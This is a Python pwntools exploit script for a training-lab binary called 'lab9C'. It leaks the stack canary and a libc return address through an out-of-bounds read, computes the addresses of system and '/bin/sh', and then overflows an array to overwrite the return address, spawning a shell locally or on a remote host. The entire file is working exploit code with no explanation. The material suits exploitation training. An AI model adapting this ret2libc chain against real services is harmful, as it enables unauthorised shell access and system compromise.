#!/usr/bin/env python2

from pwn import *

# == How to use ==
# python remote.py LOCAL
# python remote.py REMOTE IP=127.0.0.1 PORT=1337

settings = {

    # Path to binary
    "binary"        : "./lab9C",

    # Path to custom libc
    "libc"          : None,
}

def read(index):
    p.sendlineafter("Enter choice: ", "2")
    p.sendline(str(index))
    p.recvuntil("] = ")
    return int(p.recvline())

def append(num):
    p.sendlineafter("Enter choice: ", "1")
    p.sendline(str(num))

# Exploit here
def exploit():

    # Leak
    canary = read(257) & 0xffffffff
    ret = read(261) & 0xffffffff
    libc = ret - 0x18637 # local offset
    libc = ret - 0x19a83 # remote offset
    system = libc + 0x3ada0 # local offset
    system = libc + 0x40190 # remote offset
    binsh = libc + 0x15b9ab # local offset
    binsh = libc + 0x160a24 # remote offset

    log.info("Canary : {}".format(hex(canary)))
    log.info("libc : {}".format(hex(libc)))
    log.info("system : {}".format(hex(system)))
    log.info("binsh : {}".format(hex(binsh)))

    # Overwrite canary and ret
    [append(0) for i in range(256)]
    append(canary)
    append(0)
    append(0)
    append(0)
    append(system)
    append(0)
    append(binsh)

    p.sendline("3")
    p.clean()
    p.interactive()


# Initial setup
if __name__  == "__main__":

    binary = ELF(settings['binary'])
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])


    if args['LOCAL']:
        p = process(binary.path)

    if args['REMOTE']:
        if not all([args.IP, args.PORT]):
            log.warning("Missing IP/PORT arguments.")
            exit()

        p = remote(args.IP, int(args.PORT))

    if not p:
        log.warning("Missing LOCAL/REMOTE argument.")
        exit()

    pause()
    exploit()
